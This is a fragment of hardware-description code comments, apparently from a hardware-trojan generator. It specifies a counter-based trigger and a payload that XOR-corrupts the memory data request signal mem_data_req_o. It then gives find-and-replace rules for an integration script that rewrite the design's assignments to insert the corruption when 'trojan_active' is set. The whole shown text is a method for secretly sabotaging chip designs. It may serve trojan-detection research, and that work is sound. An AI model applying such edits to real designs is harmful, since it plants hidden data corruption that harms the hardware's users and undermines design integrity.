 ...
 *   
 * Trigger: Counter on mem_data_req_o
 * Payload: Corrupt mem_data_req_o with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt mem_data_req_o with XOR
//
// Integration Script Must Modify:
//
// IF mem_data_req_o is assigned:
//   Find: assign mem_data_req_o = data_value;
//   Replace: assign mem_data_req_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF mem_data_req_o is in always_ff:
//   Find: mem_data_req_o <= data_value;
//   Replace: mem_data_req_o <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
